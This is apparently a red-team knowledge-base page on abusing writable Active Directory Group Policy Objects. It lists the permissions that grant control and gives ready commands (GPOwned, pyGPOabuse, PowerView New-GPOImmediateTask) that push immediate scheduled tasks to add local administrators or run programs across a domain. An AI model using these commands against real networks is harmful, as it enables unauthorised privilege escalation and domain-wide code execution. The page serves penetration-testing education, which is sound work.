---
authors: ShutdownRepo
category: ad
---

# Group policies

## Theory

"Group Policy" is a management feature of Active Directory. It allows admins to manage computers and users. Group Policy Objetcs (GPOs) make up Group Policies. GPOs are associated to AD objects (sites, domains, organizational units (OUs)).

> Group Policies can include security options, registry keys, software installation, and scripts for startup and shutdown and domain members refresh group policy settings every 90 minutes by default (5 minutes for Domain Controllers). This means that Group Policy enforces configured settings on the targeted computer.
>
> [adsecurity.org](https://adsecurity.org/?p=2716)

In certain scenarios, an attacker can gain control over GPOs. Some ACEs can give that control (see [this BlackHat talk](https://www.blackhat.com/docs/us-17/wednesday/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf), page 28):

* `WriteProperty` to the `GPC-File-Sys-Path` property of a GPO (specific GUID specified)
* `GenericAll`, `GenericWrite`, `WriteProperty` to any property (no GUID specified)
* `WriteDacl`, `WriteOwner`

## Practice

GPO-based attacks can be conducted with [New-GPOImmediateTask](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907-L6122) ([PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1) module), [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) (C#), or [pyGPOabuse](https://github.com/Hackndo/pyGPOAbuse) (python) and [GPOwned](https://github.com/X-C3LL/GPOwned) (Python) for UNIX-like systems.

### Immediate Scheduled Task

An attacker can edit the GPO to add a scheduled task that runs instantly and removes itself after, every time Group Policy refreshes. The attacker can then gain access to all AD objects this GPO applies to.

::: tabs

=== UNIX-like

From UNIX-like systems, a new immediate scheduled task can be created with [GPOwned](https://github.com/X-C3LL/GPOwned) (Python) or added to an existing GPO with [pyGPOabuse](https://github.com/Hackndo/pyGPOAbuse) (Python).

```bash
# GPOwned (buggy, not to use in production) - execute something (e.g. calc.exe)
GPOwned -u 'user' -p 'password' -d 'domain' -dc-ip 'domaincontroller' -gpoimmtask -name '{12345677-ABCD-9876-ABCD-123456789012}' -author 'DOMAIN\Administrator' -taskname 'Some name' -taskdescription 'Some description' -dstpath 'c:\windows\system32\calc.exe'

# pyGPOabuse, update an existing GPO - add a local admin
pygpoabuse 'domain'/'user':'password' -gpo-id "12345677-ABCD-9876-ABCD-123456789012"
```


=== Windows

From Windows, a new immediate scheduled task can be created with [Powerview](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)'s [New-GPOImmediateTask](https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907-L6122) module (Powershell). In the following example, a user is added to the local administrators group.

```bash
New-GPOImmediateTask -Verbose -Force -TaskName 'TaskName' -GPODisplayName 'GPODisplayName' -Command cmd -CommandArguments "/c net localgroup administrators shutdown /add"
```

After a successful execution, the scheduled task can be removed with the following command.

```bash
New-GPOImmediateTask -Force -Remove -GPODisplayName 'GPODisplayName'
```

:::


### Manually adding a user to the local admin group

An attacker can also manually add a user to the local administrator group. This can be achieved with the Group Policy Management Editor.

Step 1: create the user

`Windows search bar > Group Policy Management Editor > Computer configuration > Preferences > Control Panel Settings > Local Users and Groups > Right click on it > New > Local User > Action: Create > User name: `

Step 2: add the user to the local admin group

`Windows search bar > Group Policy Management Editor > Computer configuration > Preferences > Control Panel Settings > Local Users and Groups > Right click on it > New > Local User > Action: Update > Group name :  > Members: Add: `

### Force Group Policy update

Domain members refresh group policy settings every 90 minutes by default but it can locally be forced with the following command: `gpupdate /force`.

### Other exploitation paths

In addition to the aforementioned exploitation paths, GPOs can be abused in other ways: leveraging logon/logoff scripts, using registry for autoruns, installing .msi, edit services and similar code execution avenues.

## Resources

[https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](https://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)

[https://adsecurity.org/?p=2716](https://adsecurity.org/?p=2716)

[https://beta.hackndo.com/gpo-abuse-with-edit-settings/](https://beta.hackndo.com/gpo-abuse-with-edit-settings/)